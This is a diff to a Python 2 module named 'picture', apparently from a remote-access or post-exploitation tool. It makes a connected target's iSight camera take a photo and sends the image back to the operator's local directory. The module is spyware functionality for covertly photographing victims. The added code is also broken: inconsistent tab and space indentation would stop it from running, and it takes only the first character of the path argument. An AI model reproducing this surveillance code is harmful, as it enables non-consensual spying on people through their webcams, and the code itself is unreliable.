@@ -25,23 +25,63 @@ class command:
     def __init__(self):
         self.name = "picture"
         self.description = "Take picture through iSight."
+	self.usage = "Usage: picture <local_path>"
         self.type = "native"
 
     def run(self,session,cmd_data):
-		h.info_general("Taking picture...")
+	if len(cmd_data['args'].split()) < 1:
+	    print self.usage
+            return
+		
+	dest = cmd_data['args'][0]
+        if os.path.isdir(dest):
+            if os.path.exists(dest):
+	        h.info_general("Taking picture...")
 		response = json.loads(session.send_command(cmd_data))
 		try:
-			success = response["status"]
-			if success == 1:
-				size = int(response["size"])
-				file_name = "isight_{0}.jpg".format(int(time.time()))
-				data = session.sock_receive_data(size)
-				h.info_general("Saving {0}".format(file_name))
-				# save to file
-				f = open(os.path.join('downloads',file_name),'w')
-				f.write(data)
-				f.close()
-				h.info_success("Saved to downloads/{0}!".format(file_name))
-		except Exception as e:
-			print e
-
+		    success = response["status"]
+		    if success == 1:
+		        size = int(response["size"])
+			data = session.sock_receive_data(size)
+			f = open(os.path.join(dest,'picture.jpg'),'w')
+			f.write(data)
+			f.close()
+		except:
+		    h.info_error("Failed to take picture!")
+		    return
+                if dest[-1:] == "/":
+                    h.info_general("Saving to "+dest+"picture.jpg...")
+                    time.sleep(1)
+                    h.info_success("Saved to "+dest+"picture.jpg!")
+                else:
+                    h.info_general("Saving to "+dest+"/picture.jpg...")
+                    time.sleep(1)
+                    h.info_success("Saved to "+dest+"/picture.jpg!")
+            else:
+                h.info_error("Local directory: "+dest+": does not exist!")
+        else:
+            rp = os.path.split(dest)[0]
+            if os.path.exists(rp):
+		if os.path.isdir(rp):
+		    pr = os.path.split(dest)[0]
+                    rp = os.path.split(dest)[1]
+		    h.info_general("Taking picture...")
+		    response = json.loads(session.send_command(cmd_data))
+		    try:
+		    	success = response["status"]
+		        if success == 1:
+		            size = int(response["size"])
+			    data = session.sock_receive_data(size)
+			    f = open(os.path.join(pr,rp),'w')
+			    f.write(data)
+			    f.close()
+		    except:
+		        h.info_error("Failed to take picture!")
+			return
+                    h.info_general("Saving to "+dest+"...")
+                    time.sleep(1)
+                    h.info_success("Saved to "+dest+"!")
+                else:
+                    h.info_error("Error: "+rp+": not a directory!")
+            else:
+                h.info_error("Local directory: "+rp+": does not exist!")
